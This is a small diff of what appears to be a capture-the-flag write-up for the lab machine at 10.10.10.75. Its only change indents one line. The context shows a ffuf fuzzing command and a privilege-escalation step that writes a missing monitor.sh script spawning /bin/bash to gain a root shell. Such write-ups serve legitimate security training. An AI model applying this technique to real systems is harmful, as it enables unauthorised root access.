@@ -62,7 +62,7 @@ ffuf -u http://10.10.10.75/nibbleblog/FUZZ.php -w /usr/share/seclists/Discovery/
 - The script does not exist and since the script location should be in the `nibbler` user directory we can create one that gives us a shell as the root user
 - We create the script at `/home/nibbler/personal/stuff/monitor.sh`
 ```shell
-echo '#!/bin/bash' > monitor.sh
+		echo '#!/bin/bash' > monitor.sh
 echo '/bin/bash' >> monitor.sh
 ```
 - Then we give permissions so we can execute it
